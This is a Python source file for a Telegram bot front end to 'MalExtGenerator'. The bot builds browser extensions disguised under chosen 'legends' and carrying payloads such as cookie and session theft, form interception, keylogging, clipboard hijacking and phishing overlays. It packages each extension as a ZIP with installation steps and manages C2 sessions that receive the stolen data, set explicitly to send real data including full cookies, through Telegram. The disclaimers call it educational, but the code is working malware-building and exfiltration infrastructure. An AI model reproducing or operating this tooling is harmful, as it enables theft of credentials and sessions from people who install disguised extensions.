import json
import os
import zipfile
from io import BytesIO
from pathlib import Path

from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message,
    CallbackQuery,
    FSInputFile,
    BufferedInputFile,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.fsm.context import FSMContext

from .keyboards import (
    main_menu_kb,
    legends_kb,
    payloads_kb,
    confirm_generation_kb,
    c2_sessions_kb,
    c2_session_kb,
    c2_settings_kb,
    after_generation_kb,
)
from .states import GenStates
from .c2 import c2_manager
from ..core.generator import MalExtGenerator
from ..core.legend_engine import LegendEngine
from ..core.payload_engine import PayloadEngine
from ..utils.logger import logger


router = Router()



def get_admin_chat_id() -> str | None:

    return os.environ.get("MALEXGEN_ADMIN_CHAT_ID", "").strip() or None


def get_bot_token() -> str | None:

    return os.environ.get("MALEXGEN_BOT_TOKEN", "").strip() or None


@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext) -> None:

    await state.clear()

    admin_chat_id = get_admin_chat_id()
    c2_status = (
        f"✅ chat_id: <code>{admin_chat_id}</code>"
        if admin_chat_id
        else "⚠️ chat_id не установлен"
    )

    text = (
        "👋 <b>MalExtGenerator</b>\n\n"
        "Образовательный генератор расширений браузера.\n"
        "Управление — полностью через этого бота.\n\n"
        "⚠️ <b>Дисклеймер:</b> инструмент создаёт ДЕМОНСТРАЦИОННЫЕ\n"
        "расширения. Если C2 включён, данные (куки, формы, сессии)\n"
        "приходят в Telegram. Используйте только на своих системах.\n\n"
        f"📡 <b>C2:</b> {c2_status}\n\n"
        "Выберите действие:"
    )

    await message.answer(text, reply_markup=main_menu_kb())
    await state.set_state(GenStates.main_menu)


@router.message(Command("help"))
async def cmd_help(message: Message) -> None:
    text = (
        "📖 <b>Помощь</b>\n\n"
        "<b>Команды:</b>\n"
        "/start — главное меню\n"
        "/list — список легенд и payload'ов\n"
        "/c2 — C2-сессии\n"
        "/setchat — установить chat_id\n"
        "/about — о проекте\n"
        "/cancel — отмена\n\n"
        "<b>Как использовать:</b>\n"
        "1. Выберите <b>легенду</b>\n"
        "2. Выберите <b>payload</b>\n"
        "3. Нажмите <b>Сгенерировать</b>\n"
        "4. Скачайте ZIP и распакуйте\n"
        "5. Загрузите папку в браузер\n"
        "6. Данные придут в этот чат\n\n"
        "⚠️ Все расширения — демонстрационные."
    )
    await message.answer(text, reply_markup=main_menu_kb())


@router.message(Command("list"))
async def cmd_list(message: Message) -> None:
    legend_engine = LegendEngine()
    payload_engine = PayloadEngine()

    text = "🎭 <b>Легенды:</b>\n\n"
    for legend in legend_engine.list_all():
        text += f"  {legend.icon} <b>{legend.name}</b> — <code>{legend.id}</code>\n"

    text += "\n⚡ <b>Payload'ы:</b>\n\n"
    for payload in payload_engine.list_all():
        text += (
            f"  {payload.icon} <b>{payload.name}</b> "
            f"{payload.risk_emoji()} — <code>{payload.id}</code>\n"
        )

    await message.answer(text, reply_markup=main_menu_kb())


@router.message(Command("about"))
async def cmd_about(message: Message) -> None:
    text = (
        "📖 <b>О проекте</b>\n\n"
        "<b>MalExtGenerator</b> — образовательный инструмент,\n"
        "который показывает, как расширения браузера могут\n"
        "быть использованы для атак.\n\n"
        "<b>Цель:</b> научить распознавать угрозы и защищаться.\n\n"
        "<b>Что демонстрирует:</b>\n"
        "• Кража куки и сессий\n"
        "• Перехват форм\n"
        "• Кейлоггер\n"
        "• Подмена буфера обмена\n"
        "• Инжект скриптов\n"
        "• Фишинговый оверлей\n\n"
        "⚠️ <b>Данные приходят в Telegram, если C2 включён.</b>\n"
        "Используйте только на своих системах.\n\n"
        "🔗 https://github.com/a11mut3d/malexgen\n\n"
        "<i>Mute Ecosystem</i>"
    )
    await message.answer(text, reply_markup=main_menu_kb())


@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext) -> None:
    await state.clear()
    await message.answer(
        "❌ Отменено.\n\nГлавное меню:",
        reply_markup=main_menu_kb(),
    )


@router.message(Command("c2"))
async def cmd_c2(message: Message) -> None:
    sessions = c2_manager.list_all()

    if not sessions:
        await message.answer(
            "📡 <b>C2-сессии</b>\n\n"
            "Нет активных сессий.\n\n"
            "Сгенерируйте расширение — сессия появится автоматически.",
            reply_markup=main_menu_kb(),
        )
        return

    text = f"📡 <b>C2-сессии</b> ({len(sessions)}):\n\n"
    for s in sessions[:10]:
        status = "🟢" if s.enabled else "🔴"
        events = len(s.events)
        text += (
            f"{status} <b>{s.legend_name}</b> + <b>{s.payload_name}</b>\n"
            f"   ID: <code>{s.session_id}</code>\n"
            f"   Событий: {events}\n\n"
        )

    await message.answer(text, reply_markup=main_menu_kb())


@router.message(Command("setchat"))
async def cmd_setchat(message: Message) -> None:
    args = message.text.split(maxsplit=1)

    if len(args) > 1:
        chat_id = args[1].strip()
        os.environ["MALEXGEN_ADMIN_CHAT_ID"] = chat_id
        await message.answer(
            f"✅ chat_id установлен: <code>{chat_id}</code>",
            reply_markup=main_menu_kb(),
        )
        return

    await message.answer(
        "📝 <b>Установка chat_id</b>\n\n"
        "Отправьте команду:\n"
        "<code>/setchat ВАШ_CHAT_ID</code>\n\n"
        "Или нажмите кнопку, чтобы узнать свой ID:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🔍 Узнать мой chat_id",
                    url="https://t.me/userinfobot",
                ),
            ],
            [
                InlineKeyboardButton(
                    text="⬅️ Назад",
                    callback_data="back",
                ),
            ],
        ]),
    )


@router.callback_query(F.data == "select_legend")
async def cb_select_legend(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.message.edit_text(
        "🎭 <b>Выберите легенду</b>\n\n"
        "Легенда — это под что маскируется расширение.",
        reply_markup=legends_kb(),
    )
    await state.set_state(GenStates.waiting_legend)
    await callback.answer()


@router.callback_query(F.data.startswith("legend:"))
async def cb_legend_selected(callback: CallbackQuery, state: FSMContext) -> None:
    legend_id = callback.data.split(":", 1)[1]
    engine = LegendEngine()

    if not engine.exists(legend_id):
        await callback.answer("Неизвестная легенда", show_alert=True)
        return

    legend = engine.get_data(legend_id)
    await state.update_data(legend_id=legend_id)

    data = await state.get_data()
    payload_id = data.get("payload_id")

    text = f"✅ Легенда: {legend.icon} <b>{legend.name}</b>\n\n"

    if payload_id:
        payload = PayloadEngine().get_data(payload_id)
        text += (
            f"✅ Payload: {payload.icon} <b>{payload.name}</b> "
            f"{payload.risk_emoji()}\n\n"
            f"Готово к генерации!"
        )
        await callback.message.edit_text(text, reply_markup=confirm_generation_kb())
        await state.set_state(GenStates.confirming)
    else:
        text += "Теперь выберите payload:"
        await callback.message.edit_text(text, reply_markup=payloads_kb())
        await state.set_state(GenStates.waiting_payload)

    await callback.answer()


@router.callback_query(F.data == "select_payload")
async def cb_select_payload(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.message.edit_text(
        "⚡ <b>Выберите payload</b>\n\n"
        "🟢 low · 🟡 medium · 🟠 high · 🔴 critical",
        reply_markup=payloads_kb(),
    )
    await state.set_state(GenStates.waiting_payload)
    await callback.answer()


@router.callback_query(F.data.startswith("payload:"))
async def cb_payload_selected(callback: CallbackQuery, state: FSMContext) -> None:
    payload_id = callback.data.split(":", 1)[1]
    engine = PayloadEngine()

    if not engine.exists(payload_id):
        await callback.answer("Неизвестный payload", show_alert=True)
        return

    payload = engine.get_data(payload_id)
    await state.update_data(payload_id=payload_id)

    data = await state.get_data()
    legend_id = data.get("legend_id")

    text = (
        f"✅ Payload: {payload.icon} <b>{payload.name}</b> "
        f"{payload.risk_emoji()} <b>{payload.risk_level}</b>\n\n"
    )

    if legend_id:
        legend = LegendEngine().get_data(legend_id)
        text += (
            f"✅ Легенда: {legend.icon} <b>{legend.name}</b>\n\n"
            f"Готово к генерации!"
        )
        await callback.message.edit_text(text, reply_markup=confirm_generation_kb())
        await state.set_state(GenStates.confirming)
    else:
        text += "Теперь выберите легенду:"
        await callback.message.edit_text(text, reply_markup=legends_kb())
        await state.set_state(GenStates.waiting_legend)

    await callback.answer()


@router.callback_query(F.data == "generate")
async def cb_generate(callback: CallbackQuery, state: FSMContext) -> None:
    data = await state.get_data()
    legend_id = data.get("legend_id")
    payload_id = data.get("payload_id")

    if not legend_id or not payload_id:
        await callback.answer("Сначала выберите легенду и payload", show_alert=True)
        return

    await _do_generate(callback, state, legend_id, payload_id)


@router.callback_query(F.data == "confirm_generate")
async def cb_confirm_generate(callback: CallbackQuery, state: FSMContext) -> None:
    data = await state.get_data()
    legend_id = data.get("legend_id")
    payload_id = data.get("payload_id")

    if not legend_id or not payload_id:
        await callback.answer("Данные потеряны", show_alert=True)
        await callback.message.edit_text("Главное меню:", reply_markup=main_menu_kb())
        return

    await _do_generate(callback, state, legend_id, payload_id)


async def _do_generate(
    callback: CallbackQuery,
    state: FSMContext,
    legend_id: str,
    payload_id: str,
) -> None:
    await callback.message.edit_text("⏳ <b>Генерация расширения...</b>")

    try:
        chat_id = get_admin_chat_id()
        bot_token = get_bot_token()

        if not chat_id:
            chat_id = str(callback.from_user.id)
            logger.info(f"[C2] Using user chat_id: {chat_id}")

        generator = MalExtGenerator()
        ext_dir = generator.generate(
            legend_id=legend_id,
            payload_id=payload_id,
            c2_bot_token=bot_token,
            c2_chat_id=chat_id,
            c2_enabled=bool(bot_token),
            c2_send_real_data=True,  # полные данные
        )

        legend = LegendEngine().get_data(legend_id)
        payload = PayloadEngine().get_data(payload_id)

        session = None
        if bot_token:
            session = c2_manager.create_session(
                legend_id=legend_id,
                payload_id=payload_id,
                legend_name=legend.name,
                payload_name=payload.name,
                bot_token=bot_token,
                chat_id=chat_id,
                enabled=True,
                send_real_data=True,
                ext_dir=str(ext_dir),
            )

        text = (
            f"✅ <b>Расширение сгенерировано!</b>\n\n"
            f"Легенда: {legend.icon} <b>{legend.name}</b>\n"
            f"Payload: {payload.icon} <b>{payload.name}</b> "
            f"{payload.risk_emoji()}\n\n"
            f"📁 <code>{ext_dir.name}</code>\n"
        )

        if session:
            text += f"\n📡 C2-сессия: <code>{session.session_id}</code>\n"
            text += f"   Данные пойдут в чат: <code>{chat_id}</code>\n"
        else:
            text += "\n⚠️ <b>C2 выключен</b> (нет токена)\n"

        text += "\n📦 Упаковываю в ZIP..."

        await callback.message.edit_text(text)
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for file_path in ext_dir.rglob("*"):
                if file_path.is_file():
                    arcname = file_path.relative_to(ext_dir)
                    zf.write(file_path, arcname)

        zip_buffer.seek(0)
        zip_bytes = zip_buffer.read()
        zip_filename = f"{ext_dir.name}.zip"

        try:
            await callback.message.answer_document(
                BufferedInputFile(zip_bytes, filename=zip_filename),
                caption=(
                    f"📦 <b>{legend.name} + {payload.name}</b>\n\n"
                    f"<b>Установка:</b>\n"
                    f"1. Скачайте и распакуйте архив\n"
                    f"2. Chrome: <code>chrome://extensions/</code>\n"
                    f"   → режим разработчика → «Загрузить распакованное»\n"
                    f"3. Firefox: <code>about:debugging#/runtime/this-firefox</code>\n"
                    f"   → «Загрузить временное дополнение»\n"
                    f"   → выберите <code>manifest.json</code>\n\n"
                    f"⚠️ Загружайте <b>папку</b>, а не отдельные файлы!"
                ),
            )
        except Exception as e:
            logger.warning(f"Failed to send ZIP: {e}")
            for filename in [
                "manifest.json", "background.js", "content.js",
                "popup.html", "popup.js", "styles.css",
            ]:
                file_path = ext_dir / filename
                if file_path.exists():
                    try:
                        await callback.message.answer_document(
                            FSInputFile(file_path),
                            caption=f"📄 {filename}",
                        )
                    except Exception:
                        pass

        install_text = (
            "📦 <b>Как установить:</b>\n\n"
            "<b>Chrome / Edge / Brave:</b>\n"
            "1. <code>chrome://extensions/</code>\n"
            "2. Режим разработчика\n"
            "3. «Загрузить распакованное расширение»\n"
            "4. Выберите <b>распакованную папку</b>\n\n"
            "<b>Firefox:</b>\n"
            "1. <code>about:debugging#/runtime/this-firefox</code>\n"
            "2. «Загрузить временное дополнение»\n"
            "3. Выберите <code>manifest.json</code> из папки\n\n"
        )

        if session:
            install_text += (
                "📡 <b>После установки:</b>\n"
                "Куки (полные, JSON-файлом) будут приходить сюда.\n\n"
            )

        await callback.message.answer(
            install_text,
            reply_markup=after_generation_kb(
                session.session_id if session else None
            ),
        )

    except Exception as e:
        logger.error(f"Generation failed: {e}", exc_info=True)
        await callback.message.edit_text(
            f"❌ <b>Ошибка:</b>\n\n<code>{e}</code>",
            reply_markup=main_menu_kb(),
        )

    await state.clear()
    await callback.answer()


@router.callback_query(F.data == "c2_list")
async def cb_c2_list(callback: CallbackQuery) -> None:
    sessions = c2_manager.list_all()

    if not sessions:
        await callback.message.edit_text(
            "📡 <b>C2-сессии</b>\n\nНет активных сессий.",
            reply_markup=main_menu_kb(),
        )
        await callback.answer()
        return

    text = f"📡 <b>C2-сессии</b> ({len(sessions)}):\n\nВыберите:"
    await callback.message.edit_text(text, reply_markup=c2_sessions_kb())
    await callback.answer()


@router.callback_query(F.data.startswith("c2_view:"))
async def cb_c2_view(callback: CallbackQuery) -> None:
    session_id = callback.data.split(":", 1)[1]
    session = c2_manager.get(session_id)

    if not session:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    status = "🟢 Включена" if session.enabled else "🔴 Выключена"

    text = (
        f"📡 <b>C2-сессия</b>\n\n"
        f"ID: <code>{session.session_id}</code>\n"
        f"Легенда: <b>{session.legend_name}</b>\n"
        f"Payload: <b>{session.payload_name}</b>\n"
        f"Статус: {status}\n"
        f"Chat ID: <code>{session.chat_id}</code>\n"
        f"Событий: <b>{len(session.events)}</b>\n"
        f"Создана: {session.created_at[:19]}\n"
    )

    await callback.message.edit_text(
        text,
        reply_markup=c2_session_kb(session_id, session.enabled),
    )
    await callback.answer()


@router.callback_query(F.data.startswith("c2_toggle:"))
async def cb_c2_toggle(callback: CallbackQuery) -> None:
    session_id = callback.data.split(":", 1)[1]
    session = c2_manager.get(session_id)

    if not session:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    new_state = not session.enabled
    c2_manager.toggle(session_id, new_state)

    status = "🟢 включена" if new_state else "🔴 выключена"
    await callback.answer(f"Сессия {status}")
    await cb_c2_view(callback)


@router.callback_query(F.data.startswith("c2_stats:"))
async def cb_c2_stats(callback: CallbackQuery) -> None:
    session_id = callback.data.split(":", 1)[1]
    session = c2_manager.get(session_id)

    if not session:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    if not session.events:
        await callback.answer("Событий пока нет", show_alert=True)
        return

    by_type: dict = {}
    for event in session.events:
        etype = event.get("type", "unknown")
        by_type[etype] = by_type.get(etype, 0) + 1

    text = f"📊 <b>Статистика</b>\n\nID: <code>{session_id}</code>\n\n"
    text += f"Всего: {len(session.events)}\n\n"
    for etype, count in by_type.items():
        text += f"  • {etype}: {count}\n"

    await callback.message.edit_text(
        text,
        reply_markup=c2_session_kb(session_id, session.enabled),
    )
    await callback.answer()


@router.callback_query(F.data.startswith("c2_file:"))
async def cb_c2_file(callback: CallbackQuery) -> None:
    session_id = callback.data.split(":", 1)[1]
    session = c2_manager.get(session_id)

    if not session:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    content = json.dumps(session.to_dict(), indent=2, ensure_ascii=False)
    file = BufferedInputFile(
        content.encode("utf-8"),
        filename=f"c2_session_{session_id}.json",
    )

    await callback.message.answer_document(
        file,
        caption=f"📄 Сессия <code>{session_id}</code>",
    )
    await callback.answer()


@router.callback_query(F.data.startswith("c2_delete:"))
async def cb_c2_delete(callback: CallbackQuery) -> None:
    session_id = callback.data.split(":", 1)[1]

    if c2_manager.delete(session_id):
        await callback.answer("Сессия удалена")
        await cb_c2_list(callback)
    else:
        await callback.answer("Сессия не найдена", show_alert=True)


@router.callback_query(F.data == "c2_settings")
async def cb_c2_settings(callback: CallbackQuery) -> None:
    chat_id = get_admin_chat_id()
    token_status = "✅" if get_bot_token() else "❌"

    text = (
        "⚙️ <b>Настройки C2</b>\n\n"
        f"Chat ID: <code>{chat_id or 'не установлен'}</code>\n"
        f"Токен: {token_status}\n"
        f"Сессий: {c2_manager.count()}\n\n"
        "Изменить chat_id: <code>/setchat ID</code>"
    )

    await callback.message.edit_text(text, reply_markup=c2_settings_kb())
    await callback.answer()


@router.callback_query(F.data == "c2_set_chat_id")
async def cb_c2_set_chat_id(callback: CallbackQuery) -> None:
    await callback.message.edit_text(
        "📝 Отправьте:\n<code>/setchat ВАШ_CHAT_ID</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="🔍 Узнать chat_id",
                url="https://t.me/userinfobot",
            )],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="c2_settings")],
        ]),
    )
    await callback.answer()


@router.callback_query(F.data == "c2_clear_all")
async def cb_c2_clear_all(callback: CallbackQuery) -> None:
    count = c2_manager.count()

    if count == 0:
        await callback.answer("Нет сессий", show_alert=True)
        return

    await callback.message.edit_text(
        f"🗑 Удалить все <b>{count}</b> сессий?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="✅ Да",
                callback_data="c2_clear_all_confirm",
            )],
            [InlineKeyboardButton(
                text="❌ Отмена",
                callback_data="c2_settings",
            )],
        ]),
    )
    await callback.answer()


@router.callback_query(F.data == "c2_clear_all_confirm")
async def cb_c2_clear_all_confirm(callback: CallbackQuery) -> None:
    count = c2_manager.clear_all()
    await callback.answer(f"Удалено {count}")
    await cb_c2_list(callback)


@router.callback_query(F.data == "my_extensions")
async def cb_my_extensions(callback: CallbackQuery) -> None:
    output_dir = Path("./output")

    if not output_dir.exists():
        await callback.message.edit_text(
            "📊 Нет расширений.",
            reply_markup=main_menu_kb(),
        )
        await callback.answer()
        return

    extensions = [
        d for d in output_dir.iterdir()
        if d.is_dir() and (d / "manifest.json").exists()
    ]

    if not extensions:
        await callback.message.edit_text(
            "📊 Нет расширений.",
            reply_markup=main_menu_kb(),
        )
        await callback.answer()
        return

    extensions.sort(key=lambda d: d.stat().st_mtime, reverse=True)

    text = f"📊 <b>Расширения</b> ({len(extensions)}):\n\n"
    for ext in extensions[:10]:
        text += f"• <code>{ext.name}</code>\n"

    if len(extensions) > 10:
        text += f"\n<i>...и ещё {len(extensions) - 10}</i>"

    await callback.message.edit_text(text, reply_markup=main_menu_kb())
    await callback.answer()


@router.callback_query(F.data == "about")
async def cb_about(callback: CallbackQuery) -> None:
    text = (
        "📖 <b>MalExtGenerator</b>\n\n"
        "Образовательный генератор расширений браузера.\n\n"
        "⚠️ Данные приходят в Telegram, если C2 включён.\n"
        "Используйте только на своих системах.\n\n"
        "🔗 https://github.com/a11mut3d/malexgen\n\n"
        "<i>Mute Ecosystem</i>"
    )
    await callback.message.edit_text(text, reply_markup=main_menu_kb())
    await callback.answer()


@router.callback_query(F.data == "back")
async def cb_back(callback: CallbackQuery, state: FSMContext) -> None:
    await state.clear()
    await callback.message.edit_text(
        "🏠 <b>Главное меню</b>",
        reply_markup=main_menu_kb(),
    )
    await callback.answer()


@router.callback_query(F.data == "cancel")
async def cb_cancel(callback: CallbackQuery, state: FSMContext) -> None:
    await state.clear()
    await callback.message.edit_text(
        "❌ Отменено.",
        reply_markup=main_menu_kb(),
    )
    await callback.answer()


@router.callback_query(F.data == "noop")
async def cb_noop(callback: CallbackQuery) -> None:
    await callback.answer()


@router.message()
async def fallback(message: Message) -> None:
    await message.answer(
        "🤔 Используйте /help или /start.",
        reply_markup=main_menu_kb(),
    )


__all__ = ["router"]
